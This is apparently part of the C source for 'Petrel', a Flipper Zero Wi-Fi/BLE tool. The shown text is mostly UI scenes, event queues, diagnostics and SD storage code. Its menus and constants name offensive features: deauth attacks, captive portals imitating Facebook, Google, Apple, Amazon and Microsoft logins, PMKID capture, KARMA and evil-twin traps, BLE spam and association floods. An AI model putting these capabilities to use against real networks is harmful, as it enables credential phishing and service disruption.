#include <furi.h>
#define TAG "Petrel"
#include <gui/gui.h>
#include <expansion/expansion.h>
#include <furi_hal.h>
#include <furi_hal_rtc.h>
#include "uart_helper.h"
#include "petrel_capture_quality.h"
#include "petrel_audit_method.h"
#include <gui/view_dispatcher.h>
#include <gui/scene_manager.h>
#include <gui/modules/menu.h>
#include <gui/modules/submenu.h>
#include <gui/modules/text_input.h>
#include <gui/modules/loading.h>
#include <gui/modules/widget.h>
#include <gui/modules/popup.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/byte_input.h>
#include <furi_hal_random.h>
#include <gui/elements.h>
#include <input/input.h>
#include <storage/storage.h>

/* generated by fbt from .png files in images folder */
#include <petrelrtl_icons.h>

/* Flipper API (api_symbols.csv) disables strtok, strtok_r AND strcat ('-'); strlen/memcpy/
 * strchr are enabled ('+'). Using any of the disabled ones makes the FAP "not runnable"
 * (APPCHK fails to resolve the symbol). These are self-contained replacements.
 * petrel_strtok has strtok_r semantics (caller passes an explicit saveptr) so interleaved or
 * nested parses on the same thread can never corrupt a shared static cursor. */
static char* petrel_strtok(char* str, const char* delim, char** saveptr) {
    char* s = str ? str : *saveptr;
    if(!s) return NULL;
    while(*s && strchr(delim, *s)) s++;            // skip leading delimiters
    if(!*s) { *saveptr = NULL; return NULL; }
    char* tok = s;
    while(*s && !strchr(delim, *s)) s++;           // run to next delimiter
    if(*s) { *s = '\0'; *saveptr = s + 1; } else { *saveptr = NULL; }
    return tok;
}
static void petrel_strcat(char* dst, const char* src) {
    size_t dl = strlen(dst), sl = strlen(src);
    memcpy(dst + dl, src, sl + 1);                 // copy src incl. its NUL
}

#define DEVICE_BAUDRATE        115200
#define LINE_DELIMITER         '\n'
#define INCLUDE_LINE_DELIMITER false
#define MAC_LENGH              6

#define WEP_ENABLED    0x0001
#define TKIP_ENABLED   0x0002
#define AES_ENABLED    0x0004
#define AES_CMAC_ENABLED 0x0010
#define ENTERPRISE_ENABLED 0x0020
#define SHARED_ENABLED 0x00008000
#define WPA_SECURITY   0x00200000
#define WPA2_SECURITY  0x00400000
#define WPA3_SECURITY  0x00800000

//Pantallas APP
typedef enum {
    mainMenuScene,
    scanNetworksScene,
    listNetworksScene,
    wifiInfoScene,
    configAttackScene,
    evilCredsScene,
    aPmacAddresScene,
    beaconNetworkScene,
    customBeaconScene,
    beaconInfoScene,
    configAPScene,
    helpScene,
    popupScene,
    busyScene,
    pmfScene,
    toolsMenuScene,
    channelMapScene,
    bleAdvInputScene,
    ibeaconInputScene,
    wifiHubScene,
    bleHubScene,
    bleAdvLibScene,
    portalListScene,
    settingsScene,
    sessionScene,
    gattScene,
    blespamScene,
    trackerScene,
    browseScene,
    karmaScene,
    scriptListScene,
    scriptRunScene,
    recordScene,
    pickApScene,
    batchScene,

    PetrelSceneCount
} PetrelScene;

//Vistas APP
typedef enum {
    mainMenuView,
    loadingView,
    scannedWifisView,
    wifiInfoView,
    configAttackView,
    evilCredsView,
    aPmacAddresView,
    beaconListView,
    bssidTextInputView,
    beaconInfoView,
    configAPView,
    apNameTextInputView,
    apPasswordTextInputView,
    helpView,
    popupView,
    busyView,
    pmfView,
    toolsListView,
    channelMapView,
    cardMenuView,
    settingsView,

} PetrelView;

#define CAPTIVE_PORTAL_SIZE 8
const char* const captive_portals[CAPTIVE_PORTAL_SIZE] = {
    "Default",
    "Facebook",
    "Amazon",
    "Apple",
    "Microsoft",
    "Google",
    "Custom (file)",
    "Rotate",
};

const char* const deauth_reasons[25] = {
    "Reserved.",
    "Unspecified reason.",
    "Previous authentication no longer valid.",
    "Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.",
    "Disassociated due to inactivity.",
    "Disassociated because WAP device is unable to handle all currently associated STAs.",
    "Class 2 frame received from nonauthenticated STA.",
    "Class 3 frame received from nonassociated STA.",
    "Disassociated because sending STA is leaving or has left Basic Service Set (BSS).",
    "STA requesting (re)association is not authenticated with responding STA.",
    "Disassociated because the information in the Power Capability element is unacceptable.",
    "Disassociated because the information in the Supported Channels element is unacceptable.",
    "Disassociated due to BSS Transition Management.",
    "Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.",
    "Message integrity code (MIC) failure.",
    "4-Way Handshake timeout.",
    "Group Key Handshake timeout.",
    "Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.",
    "Invalid group cipher.",
    "Invalid pairwise cipher.",
    "Invalid AKMP.",
    "Unsupported RSNE version.",
    "Invalid RSNE capabilities.",
    "IEEE 802.1X authentication failed.",
    "Cipher suite rejected because of the security policy.",
};
// Short labels for the "Deauth Reason" row: the full IEEE text above is wider than the
// variable-item value column, so the on-screen value was clipped ("<nger vali>").
const char* const deauth_reason_short[25] = {
    "resvd", "unsp",  "prev",  "leave", "inact", "busy",  "cls2",
    "cls3",  "leav2", "nauth", "pwrcp", "supch", "bsstr", "elem",
    "mic",   "4way",  "grptmo", "4wayd", "gciph", "pciph", "akmp",
    "ver",   "caps",  "8021x", "ciph",
};
static const Icon* rick[] = {&I_rick0,  &I_rick1,  &I_rick2,  &I_rick3,  &I_rick4,  &I_rick5,
                             &I_rick6,  &I_rick7,  &I_rick8,  &I_rick9,  &I_rick10, &I_rick11,
                             &I_rick12, &I_rick13, &I_rick14, &I_rick15, &I_rick16, &I_rick17,
                             &I_rick18, &I_rick19, &I_rick20, &I_rick21, &I_rick22, &I_rick23};
const char* const mac_type[4] = {
    "Default",

    "Random",
    "Custom",
    "Same as AP",
};

const char* const securityType[2] = {
    "OPEN",
    "WPA",
};

const char* const channelList[59] = {"1",   "2",   "3",   "4",   "5",   "6",   "7",   "8",   "9",
                                     "10",  "11",  "12",  "13",  "14",  "36",  "38",  "40",  "42",
                                     "44",  "46",  "48",  "50",  "52",  "54",  "56",  "58",  "60",
                                     "62",  "64",  "100", "102", "104", "106", "108", "110", "112",
                                     "114", "116", "118", "120", "122", "124", "126", "128", "132",
                                     "134", "136", "138", "140", "142", "144", "149", "151", "153",
                                     "155", "157", "159", "161", "165"};

#define WIFI_MAX 48
typedef struct {
    int idAP;
    char APssid[33]; // fixed buffer: the AP list lives in BSS, no heap churn / no worker-vs-GUI realloc race
    char APbssid[18];
    int chanel;
    int rssi;
    int security;
    bool deauth;
} APDetails;

char credentials[1000];
char message[128];
static char recon_text[1024];
static char recon_title[24];
static char wpa_lines[512]; // PMKID WPA*01* lines -> /ext/petrel/pmkid.22000
static bool hop_on = false;
static bool busy_active = false; // true while the animated busy scene owns the stack
// FNV-1a of the portal bytes we streamed to the board, checked against its PORTALHASH reply
// so a corrupted upload cannot go unnoticed.
static uint32_t portal_exp_hash = 0;
static uint16_t portal_exp_len = 0;
// Session id captured at app start; all scan artefacts go under /ext/petrel/sessions/<id>/.
static char petrel_session_id[48] = "session";   // base(31) + "_NNN" must fit (D6-1)

// --- E4 settings globals: Def. channel / Scan wait / Vibration / Save results -----
#define SET_CHANNELS_N 21
static const char* const set_channels[SET_CHANNELS_N] = {
    "1",  "2",  "3",  "4",  "5",  "6", "7",  "8",   "9",   "10", "11",
    "12", "13", "36", "40", "44", "48", "149", "153", "157", "161"};
static int set_channel_idx = 5; // -> "6"
static int set_scan_wait = 12;
static bool set_vibro = true;
static bool set_save = true;

static int petrel_def_ch(void) {
    return atoi(set_channels[set_channel_idx]);
}

// --- E8: per-run session counters (shown on the "Session summary" screen) ---------
static int sess_creds = 0;
static int sess_probes = 0;
static int sess_stas = 0;
static int sess_pmf = 0;
static int sess_wifis = 0;
static int sess_deauth = 0;
// E7 browse: the hub sets this so a fresh entry starts at the session list (level 0).
static bool browse_reset = true;

// --- D1: BLE devices seen in the last scan (so "GATT enumerate" can pick one) -----
// A3/D4: ble_list_tag holds the firmware's vendor/fingerprint label (Apple/FindMy/Tile/...)
// so the "Trackers" screen can flag likely tracker devices.
#define BLE_LIST_MAX 16
static char ble_list_mac[BLE_LIST_MAX][18];
static char ble_list_name[BLE_LIST_MAX][24];
static char ble_list_tag[BLE_LIST_MAX][16];
static int ble_list_n = 0;

// Devices whose vendor/fingerprint label marks them as (possible) location trackers.
static bool ble_is_tracker(const char* tag) {
    if(!tag || !tag[0]) return false;
    return !strcmp(tag, "FindMy") || !strcmp(tag, "Airtag") || !strcmp(tag, "AirTag") ||
           !strcmp(tag, "Tile") || !strcmp(tag, "SmartTag") || !strcmp(tag, "Samsung");
}
// E: guided-audit context (written to /ext/petrel/audit.json when a grab finishes)
static bool audit_mode = false;
static char audit_ssid[33];
static char audit_bssid[18];
static uint8_t audit_bssid_bytes[6];     // target BSSID as bytes, for pcq/PMKID target binding
static bool audit_bssid_valid = false;   // true only when a specific (non-wildcard) target is set
static int audit_ch = 0;
static int audit_sec = 0;
static char audit_hex[13];                // target BSSID, 12 hex no colons (for STASCAN/grab)
// Guided audit runs an async scan chain before it commits to a method: PMFSCAN -> (maybe) STASCAN
// -> grab. audit_phase tracks which reply we are waiting for; all reads/writes are on the GUI
// (dispatcher) thread (uart_process_line + scene handlers), so no volatile is needed.
typedef enum {
    AUDIT_PHASE_NONE = 0, // no scan in flight (either idle, or the grab was already sent)
    AUDIT_PHASE_PMF,      // PMFSCAN sent, waiting PMFDONE
    AUDIT_PHASE_STA,      // STASCAN sent, waiting STADONE
} AuditScanPhase;
static AuditScanPhase audit_phase = AUDIT_PHASE_NONE;
static bool audit_pmf_seen = false;       // the PMFSCAN produced a PMF: line for the target
static bool audit_pmf_req = false;        // ...and it said mfp=req (PMF mandatory)
static int audit_stas = 0;                // stations seen for the target in the STASCAN
//Objeto del APP

typedef struct Petrel {
    SceneManager* scene_manager;
    ViewDispatcher* view_dispatcher;
    Loading* loading;
    Menu* menu;
    VariableItemList* variableList;
    Submenu* submenu;
    ByteInput* byteInput;
    int submenuIndex;
    int menuIndex;
    TextInput* text_input;
    Widget* widget;
    char* ssidAP;
    uint8_t ssidAPLength;
    UartHelper* uart_helper;
    // Board lines are queued by the UART worker and drained on the dispatcher thread (see
    // uart_enqueue_line / uart_gui_tick). The worker must never touch scene state: the list scene
    // sorts wifiList in place, and the worker used to append to that same array mid-sort.
    FuriMessageQueue* uart_lines;
    bool scan_waiting;
    uint32_t scan_deadline;
    APDetails wifiList[WIFI_MAX];
    int selectedWifi;
    int wifiCount;
    int ap_idx_name; // Create-AP screen row indices (tracked, since rows are conditional)
    int ap_idx_pass;
    int ap_idx_load;
    int ap_idx_start;
    int captivePortal;
    int deauthReason;
    int mac_type;
    char customMac[18];
    uint8_t byte_input_store[MAC_LENGH];
    FuriTimer* timer;
    int rickIndex;
    int securityAP;
    int passwordAPLength;
    char* passwordAP;
    uint8_t channelAP;
    char fw_version[16]; // from the board's IDENT (HELLO handshake)
    char fw_caps[16];    // capability letters, e.g. "DSEBH"
    uint8_t ident_attempts;   // HELLO attempts made (architect: bounded to 3)
    uint32_t ident_last_tick; // when the last HELLO went out
    View* chanMapView;   // G: channel-map canvas view
    View* cardView;      // card-grid main menu
    View* busyView;      // animated "working" screen (name + spinner, no dolphin)
    FuriTimer* busyTimer;
    FuriTimer* karmaTimer;   // B1: polls the board for caught SSIDs while the KARMA screen is up
    FuriTimer* scriptTimer;  // F1: advances the SD script engine one step per tick
    char bleAdvHex[80];  // #5: BLE adv hex payload (typed / saved)
    char ibeaconUuid[40];// #6: iBeacon UUID hex (typed)
    uint32_t shot_tick;  // last framebuffer mirror write (throttle)
    uint32_t shot_last_sum; // FNV of the last captured frame (skip identical frames)
} Petrel;

// --- Non-blocking custom-event ring (prioritised plan, item #1) ------------------------------
// The dispatcher's own custom-event queue holds 16 entries and
// view_dispatcher_send_custom_event() waits FOREVER when it is full (furi_message_queue_put with
// FuriWaitForever + furi_check). Producers here are the 10 ms UART tick - which runs ON the
// dispatcher thread, so a full queue is a self-deadlock - and the periodic FuriTimer callbacks,
// where blocking stalls the whole timer service. So events go through this app-owned ring
// instead: producers append (never blocking, never losing the newest event) and the tick drains
// it on the GUI thread through the same scene_manager_handle_custom_event() the dispatcher uses.
// On overflow the OLDEST entry is dropped: the UI wants the newest state, and every event in the
// ring is a UI refresh or a completion the scene can re-derive.
#define POST_RING 64
static uint32_t post_ring[POST_RING];
static volatile uint8_t post_head = 0;
static volatile uint8_t post_tail = 0;
static FuriMutex* post_mutex = NULL;

// --- Diagnostics (architect design, pass 1) ---------------------------------------------------
// A preallocated binary ring of fixed-size records: diag() never allocates and never does storage
// I/O, so it is safe from the GUI thread, a timer and the storage worker alike. The storage worker
// flushes it (batched, with a periodic sync) to /ext/petrel/diag.bin, so a crash+reboot - which wipes
// the RAM log - still leaves the last records on the card. Heap figures come from the firmware's own
// counters, which is what turns "it crashed" into "the heap was already falling".
#include <furi/core/memmgr.h>
#include <furi/core/memmgr_heap.h>

// 64 records, not 256: this ring is static (.bss), and the FAP's whole budget is small - a 256-slot
// ring is 8 KB, which together with the 6 KB stack is most of the ~20 KB the device has free. The
// instrument must not become the problem it is meant to find.
#define DIAG_N 32
typedef struct {
    uint32_t seq;
    uint32_t tick;
    uint32_t kind;      // 1 tick sample, 2 post_event, 3 take_event, 4 dispatch, 5 show_result
    uint32_t a;
    uint32_t b;
    uint32_t free_now;
    uint32_t boot_min;
    uint32_t largest;
} DiagRec;
static DiagRec diag_ring[DIAG_N];
static volatile uint32_t diag_head = 0;      // next slot to write
static volatile uint32_t diag_flushed = 0;   // next slot to persist
static volatile uint32_t diag_seq = 0;
static volatile uint32_t diag_dropped = 0;
// diag() is called from the GUI, the UART worker, the timer and the storage worker, so the
// reservation and the record write need a lock: two producers could otherwise take the same slot
// and lose a head/sequence increment. SD I/O stays outside the lock (see diag_flush).
static FuriMutex* diag_mutex = NULL;

static void diag(uint32_t kind, uint32_t a, uint32_t b) {
    if(!diag_mutex) return;                 // allocated in app_alloc, freed in app_free
    furi_mutex_acquire(diag_mutex, FuriWaitForever);
    uint32_t h = diag_head;
    // The producer never moves diag_flushed (that would race the consumer's increment); the
    // consumer clamps it on overflow and counts what it had to skip. Counting here instead would
    // overcount: a record overwritten after being copied into the batch is still persisted.
    DiagRec* r = &diag_ring[h % DIAG_N];
    r->seq = ++diag_seq;
    r->tick = furi_get_tick();
    r->kind = kind;
    r->a = a;
    r->b = b;
    r->free_now = (uint32_t)memmgr_get_free_heap();
    r->boot_min = (uint32_t)memmgr_get_minimum_free_heap();
    r->largest = (uint32_t)memmgr_heap_get_max_free_block();
    diag_head = h + 1;                                // publish last
    furi_mutex_release(diag_mutex);
}

// Persist the ring to the card. Called by the storage worker (batched) and once more from app_free
// AFTER the worker has been joined: app_free used to stop the worker while the self-test's own
// completion record was still in the ring, so the record that says the run finished could be lost.
static void diag_flush(void) {
    if(!diag_mutex) return;
    // Copy a batch out under the lock, then write it with the lock released: a producer never waits
    // on the SD card.
    static DiagRec batch[8];   // small: this is BSS, the ring itself is already 2 KB
    uint32_t n = 0;
    furi_mutex_acquire(diag_mutex, FuriWaitForever);
    if(diag_head - diag_flushed > DIAG_N) {                 // skip records that were overwritten
        diag_dropped += (diag_head - diag_flushed) - DIAG_N;
        diag_flushed = diag_head - DIAG_N;
    }
    while(diag_flushed + n != diag_head && n < 8) {
        batch[n] = diag_ring[(diag_flushed + n) % DIAG_N];
        n++;
    }
    furi_mutex_release(diag_mutex);
    if(n == 0) return;
    // The batch is copied, so the SD writes happen with the lock released: a producer never waits
    // on card latency. The cursor is advanced afterwards, under the lock, by what was written.
    Storage* dst = furi_record_open(RECORD_STORAGE);
    File* df = storage_file_alloc(dst);
    if(storage_file_open(df, "/ext/petrel/diag.txt", FSAM_WRITE, FSOM_OPEN_APPEND)) {
        // One fixed-width TEXT line per record: numeric IDs, written with snprintf into a stack
        // buffer, so still no allocation on any thread - and readable straight off the card with the
        // CLI, which mangles binary. Same fields as the binary record.
        char line[96];
        uint32_t written = 0;
        bool short_write = false;
        for(uint32_t i = 0; i < n; i++) {
            DiagRec* r = &batch[i];
            int w = snprintf(
                line, sizeof(line), "%lu %lu %lu %lu %lu %lu %lu %lu\n",
                (unsigned long)r->seq, (unsigned long)r->tick, (unsigned long)r->kind,
                (unsigned long)r->a, (unsigned long)r->b, (unsigned long)r->free_now,
                (unsigned long)r->boot_min, (unsigned long)r->largest);
            // A short write still counts as consumed: retrying the line would duplicate its prefix
            // (the file is append-only and cannot be truncated).
            if(storage_file_write(df, line, (size_t)w) != (size_t)w) { short_write = true; written++; break; }
            written++;
        }
        furi_mutex_acquire(diag_mutex, FuriWaitForever);
        diag_flushed += written;
        if(short_write) diag_dropped++;
        furi_mutex_release(diag_mutex);
        storage_file_sync(df);
        storage_file_close(df);
    }
    storage_file_free(df);
    furi_record_close(RECORD_STORAGE);
}

// Safe from any thread. Holds the mutex for a handful of instructions; never waits on the GUI.
static void post_event(Petrel* app, uint32_t ev) {
    diag(2, ev, 0);
    UNUSED(app);                     // kept so call sites read the same as the dispatcher API
    if(!post_mutex) return;          // allocated first in app_alloc, freed last in app_free
    furi_mutex_acquire(post_mutex, FuriWaitForever);
    uint8_t next = (uint8_t)((post_head + 1) % POST_RING);
    if(next == post_tail) post_tail = (uint8_t)((post_tail + 1) % POST_RING); // full: drop oldest
    post_ring[post_head] = ev;
    post_head = next;
    furi_mutex_release(post_mutex);
}

// --- Storage worker (prioritised plan, item #5) ----------------------------------------------
// The UART line handler runs on the GUI thread and used to write captures, credential records,
// scan results and audit/PMKID files to the SD card SYNCHRONOUSLY, from inside the tick - stalling
// input for the duration of the write, and letting the board's 127-byte UART ring overflow while
// it kept talking. Writers now serialise an immutable snapshot and hand it over; one worker thread
// does the I/O. A full queue drops the job and says so rather than blocking the GUI thread, and
// shutdown drains the queue instead of waiting on it.
#define STORAGE_Q 8
typedef struct {
    char path[160];
    char* data;      // owned by the queue, then by the worker
    size_t len;
    bool append;
} StorageJob;
static StorageJob storage_q[STORAGE_Q];
static volatile uint8_t storage_head = 0;
static volatile uint8_t storage_tail = 0;
static FuriMutex* storage_mutex = NULL;
static FuriThread* storage_thread = NULL;
static volatile bool storage_run = false;
static volatile uint16_t storage_dropped = 0;
static char storage_status[64] = "";   // last outcome, for a status screen
// Set by the worker on any failure (short write / cannot open). The GUI tick turns it into a popup:
// a failed save used to be completely silent, so the screen showed "saved" (or a frame count) while
// nothing had reached the card.
// Bumped once per FAILED write. The tick shows a popup when the number changes, so a failure that
// repeats on every keypress cannot push a scene on every tick - scene_manager_next_scene() grows the
// navigation history without a fixed depth limit, which is what produced "out of memory".
static volatile uint32_t storage_fail_seq = 0;
// Binary scan list: the board sends idx/total in every DP_SCAN_AP frame, so the GUI thread knows
// when the whole list has been parsed and can persist it without waiting for the user to open List Wifi.
static volatile uint8_t scan_expect_total = 0;

// storage_status is written by the storage/UART worker and read by the GUI tick; storage_mutex is
// only ever held for the queue, so it is free to guard this too.
#define STORAGE_STATUS(...) do { \
    furi_mutex_acquire(storage_mutex, FuriWaitForever); \
    snprintf(storage_status, sizeof(storage_status), __VA_ARGS__); \
    furi_mutex_release(storage_mutex); \
} while(0)

// Called from any thread. Takes ownership of data on success; returns false (and the caller frees)
// when the queue is full, so nothing ever blocks here.
static bool storage_submit(const char* path, char* data, size_t len, bool append) {
    if(!storage_mutex || !storage_run || !data) return false;
    diag(13, (uint32_t)len, append ? 1u : 0u);       // snapshot size offered to the worker
    bool ok = false;
    furi_mutex_acquire(storage_mutex, FuriWaitForever);
    uint8_t next = (uint8_t)((storage_head + 1) % STORAGE_Q);
    if(next != storage_tail) {
        snprintf(storage_q[storage_head].path, sizeof(storage_q[0].path), "%s", path);
        storage_q[storage_head].data = data;
        storage_q[storage_head].len = len;
        storage_q[storage_head].append = append;
        storage_head = next;
        ok = true;
    } else {
        storage_dropped++;
    }
    furi_mutex_release(storage_mutex);
    return ok;
}

// --- Ekran yakalama (RPC'siz) -----------------------------------------------------------------
// Runbook ekran görüntülerini flipctl ile alıyordu; flipctl her komutta bir RPC oturumu açar ve o
// oturum heap'ten ~20 KB alır (2026-10-28 koşusunda ölçüldü). FAP'in hub'da bıraktığı boş bellek
// 19 KB olduğu için ekran görüntüsü OOM çökmesine yol açıyordu (C1-C6). Gui'nin framebuffer commit
// callback'i cihazın çizdiği kareyi doğrudan verir: heap maliyeti yok. Kare 64 karakterlik hex
// satırları olarak SD'ye yazılır (CLI binary okuyamaz); tools/flip_shot.py PNG'ye çevirir.
#define SHOT_HEX_PATH "/ext/petrel/shot.hex"
#define SHOT_BYTES    1024u   // 128x64, 1 bit/piksel, SSD1306 page layout

static void petrel_fb_callback(
    uint8_t* data,
    size_t size,
    CanvasOrientation orientation,
    void* context) {
    UNUSED(orientation);
    Petrel* app = context;
    if(!app || size < SHOT_BYTES) return;
    uint32_t now = furi_get_tick();
    if(now - app->shot_tick < furi_ms_to_ticks(400)) return;   // en fazla ~2.5 kare/sn
    // Ayni kareyi tekrar yazma: SD'ye yalnizca ekran gercekten degistiginde dokunulur. 1 KB'lik
    // karsilastirma buffer'i yerine 32-bit FNV izi tutulur (bellek maliyeti yok).
    uint32_t sum = 2166136261u;
    for(size_t i = 0; i < SHOT_BYTES; i++) sum = (sum ^ data[i]) * 16777619u;
    if(sum == app->shot_last_sum) return;
    app->shot_last_sum = sum;
    app->shot_tick = now;
    char* hex = malloc(2048u + 40u);                           // 2048 hex + satir sonlari
    if(!hex) return;                                           // yer yoksa sessizce atla
    static const char* H = "0123456789abcdef";
    size_t o = 0;
    for(size_t i = 0; i < SHOT_BYTES; i++) {
        if(i && (i % 32u) == 0) hex[o++] = '\n';
        hex[o++] = H[data[i] >> 4];
        hex[o++] = H[data[i] & 0x0f];
    }
    hex[o++] = '\n';
    if(!storage_submit(SHOT_HEX_PATH, hex, o, false)) free(hex);
}

// Synchronous, CONFIRMED write for audit evidence. The audit record must be able to state whether
// the capture actually reached the card (captured != saved - a slow/failed SD must not read as a
// completed, saved audit). This runs on the UART worker thread, not the GUI thread, so a blocking
// SD write here does not stall the UI. Non-audit writers keep using the async storage_submit queue.
static bool storage_write_now(const char* path, const char* data, size_t len, bool append) {
    if(!data) return false;
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* fh = storage_file_alloc(st);
    FS_OpenMode om = append ? FSOM_OPEN_APPEND : FSOM_CREATE_ALWAYS;
    bool ok = false;
    if(storage_file_open(fh, path, FSAM_WRITE, om)) {
        size_t w = storage_file_write(fh, data, len);
        ok = (w == len);
        if(ok) {
            STORAGE_STATUS("saved %.12s", strrchr(path, '/') ? strrchr(path, '/') + 1 : path);
        } else {
            STORAGE_STATUS("SD full? %u/%u bytes", (unsigned)w, (unsigned)len);
            storage_fail_seq++;
        }
        storage_file_close(fh);
    } else {
        STORAGE_STATUS("no SD / open failed");
        storage_fail_seq++;
    }
    storage_file_free(fh);
    furi_record_close(RECORD_STORAGE);
    return ok;
}

static int32_t storage_worker(void* context) {
    UNUSED(context);
    while(storage_run) {
        StorageJob job = {0};
        bool have = false;
        furi_mutex_acquire(storage_mutex, FuriWaitForever);
        if(storage_tail != storage_head) {
            job = storage_q[storage_tail];
            storage_tail = (uint8_t)((storage_tail + 1) % STORAGE_Q);
            have = true;
        }
        furi_mutex_release(storage_mutex);
        if(!have) {
            furi_delay_ms(20);
        }
        // Persist diagnostics: batched, synced, and never from the caller's thread. A crash+reboot
        // wipes the RAM log, so the last records must already be on the card.
        {
            static uint32_t last_diag = 0;
            uint32_t nowt = furi_get_tick();
            uint32_t pending = diag_head - diag_flushed;
            if(pending > 0 &&
               ((uint32_t)(nowt - last_diag) >= furi_ms_to_ticks(250) || pending >= 64)) {
                last_diag = nowt;
                diag_flush();
            }
        }
        if(!have) {
            continue;
        }
        diag(16, (uint32_t)job.len, 0);              // job dequeued for writing
        Storage* st = furi_record_open(RECORD_STORAGE);
        File* f = storage_file_alloc(st);
        FS_OpenMode om = job.append ? FSOM_OPEN_APPEND : FSOM_CREATE_ALWAYS;
        if(storage_file_open(f, job.path, FSAM_WRITE, om)) {
            size_t w = storage_file_write(f, job.data, job.len);
            if(w != job.len) {
                // Short write: the card may be full. Say so instead of pretending it saved.
                STORAGE_STATUS("SD full? %u/%u bytes", (unsigned)w, (unsigned)job.len);
                storage_fail_seq++;
                FURI_LOG_E(TAG, "storage short write %s %u/%u", job.path, (unsigned)w,
                           (unsigned)job.len);
            } else {
                STORAGE_STATUS("saved %.12s",
                               strrchr(job.path, '/') ? strrchr(job.path, '/') + 1 : job.path);
            }
            storage_file_close(f);
        } else {
            STORAGE_STATUS("no SD / open failed");
            storage_fail_seq++;
            FURI_LOG_E(TAG, "storage open failed %s", job.path);
        }
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
        free(job.data);
    }
    return 0;
}

// GUI thread only (the tick). False when nothing is pending.
static bool take_event(uint32_t* ev) {
    if(!post_mutex) return false;
    bool ok = false;
    furi_mutex_acquire(post_mutex, FuriWaitForever);
    if(post_tail != post_head) {
        *ev = post_ring[post_tail];
        post_tail = (uint8_t)((post_tail + 1) % POST_RING);
        ok = true;
    }
    furi_mutex_release(post_mutex);
    return ok;
}

// Model for the animated "working" screen (busyView): spinner phase + a countdown.
typedef struct {
    uint8_t phase;
    int8_t remain_s; // remaining seconds (0 = no countdown)
} BusyModel;

//Las opciones del menu
typedef enum {
    ScanWifi = 0,
    ListWifis = 1,
    CustomBeacon = 2,
    CreateAP = 3,
    Help = 4,
    Exit = 5,
    ChannelMap = 6,
    BleScan = 7,
    BleBeacon = 8,
    BadBle = 9,
    PortalFile = 10,
    BleAdvHex = 11,
    BleAdvReplay = 12,
    IBeaconUuid = 13,
    BadBleFile = 14,
    WifiHub = 15,
    BleHub = 16,
} MainMenuIndex;

// Tools submenu item IDs — stable across capability-gating (dispatch keys off these,
// not row order, so hiding an item never mis-routes the others).
#define TOOL_CAPTURE 0
#define TOOL_GRAB    1
#define TOOL_PMF     2
#define TOOL_STA     3
#define TOOL_PMKID   4
#define TOOL_PKGRAB  5
#define TOOL_HOP     6
#define TOOL_DAADD   7
#define TOOL_DARUN   8
#define TOOL_STOP    9
#define TOOL_DASTOP  10
#define TOOL_CAPSTOP 11
#define TOOL_AUDIT   12
#define TOOL_PKCLIENT 13
#define TOOL_PROBE   14
#define TOOL_IDS     15
#define TOOL_CSA     16
#define TOOL_TRACK   17
#define TOOL_BTM     18
#define TOOL_PICKAP  20
#define TOOL_AUTHFLOOD  21
#define TOOL_ASSOCFLOOD 22
#define TOOL_SAEFLOOD   23

// Deferred GUI events posted from the UART worker thread (GUI must run on the GUI thread).
#define PETREL_EVT_RECON 0x2000
#define PETREL_EVT_POPUP 0x2001
#define PETREL_EVT_BUSY_TICK 0x2003
#define PETREL_EVT_BUSY_TIMEOUT 0x2004
#define PETREL_EVT_EXIT 0x2005
#define PETREL_EVT_CREDS 0x2002
#define PETREL_EVT_KARMA 0x2006
#define PETREL_EVT_KARMA_POLL 0x2007
#define PETREL_EVT_SCRIPT_TICK 0x2008
#define PETREL_EVT_REC_REFRESH 0x2009
#define PETREL_EVT_BATCH_REFRESH 0x200A
#define PETREL_EVT_BATCH_RUN 0x200B
#define PETREL_EVT_POP 0x200C   // pop one scene from the dispatcher, never from a view callback
// Info screen buttons (Edit / Deauth / Evil). They are posted as custom events instead of being
// handled in the widget button callback: on the installed firmware the GUI is an event loop and
// handle_input() binds a key to the view that is current when the key is *processed*, so switching
// the view (or resetting the widget) from inside that handler faults the Flipper. Pressing Edit
// used to reach the attack config by luck; it does not on this build - it hard-resets the device.
// Posted events are handled between frames, which is safe (same fix as the KARMA screen).
// IDs must be UNIQUE per scene-message: these two used to share 0x200A / 0x200B with
// PETREL_EVT_BATCH_REFRESH / PETREL_EVT_BATCH_RUN above, so a batch event still queued when the
// user navigated to the Info screen was decoded as "Info Edit" and opened the text input.
#define PETREL_EVT_INFO_EDIT 0x200F
#define PETREL_EVT_INFO_DEAUTH 0x2010
#define PETREL_EVT_INFO_EVIL 0x200C
// AP config: the list's enter callback used to set the text input up and switch to it inline.
// Same "view work inside a view callback" shape as PETREL_EVT_INFO_* - defer it to the scene.
#define PETREL_EVT_AP_EDIT_NAME 0x200D
#define PETREL_EVT_AP_EDIT_PASSWORD 0x200E
// Rebuild the variable-item list of the CURRENT config scene (AP config / attack config).
// The security, channel and MAC-type change callbacks used to call *_scene_on_enter() directly,
// which runs variable_item_list_reset() on the very list that is dispatching the callback - the
// framework then walks items that were just freed. Post instead; each scene's on_event rebuilds
// between frames. Shared by both scenes: only the active one receives it.
#define PETREL_EVT_REBUILD_VIL 0x2011
// Animation frame for the RickRoll screen. The frame used to be built by the animation timer's
// callback on the TIMER thread, mutating the shared widget while the GUI could be drawing it.
#define PETREL_EVT_ANIM_TICK 0x2012
// "Start AP" from the Create-AP list. The action used to run inline in the list's enter callback
// (state commands + a scene switch, with four 150 ms sleeps between them).
#define PETREL_EVT_AP_START 0x2013
// The board's capability string arrived - possibly late. Menus are built once in on_enter, so a
// board that was silent at startup left the Tools screen showing "no board" forever.
#define PETREL_EVT_REIDENTIFIED 0x2014
// B1: raw payload of the last KARMALIST reply ("<n>|ssid|ssid|..."), rendered by the KARMA scene.
static char karma_list[192];
// C1: same scene drives both modes - plain KARMA (answer probes) and Trap (clone the network for
// real with a softAP + portal). The hub items set this before entering.
static bool karma_trap = false;
// Installed once on the widget view; the scenes toggle this flag instead of swapping the callback
// in and out. Installing/clearing the callback while the view is dispatching its own input (scene
// on_enter/on_exit run inside that dispatch) crashed the Flipper.
static bool karma_active = false;
static char trap_state[40];   // last "ap=..." reported by the board (Trap mode)
static char karma_saved[192]; // last SSID list written to SD (so we only write on change)
static int karma_chan_sel = 0;// Trap/KARMA channel picked with UP/DOWN on that screen

typedef enum {
    SsidAPInputSceneSaveEvent,
} CustoAPInputEvent;

bool scanFinish = false;
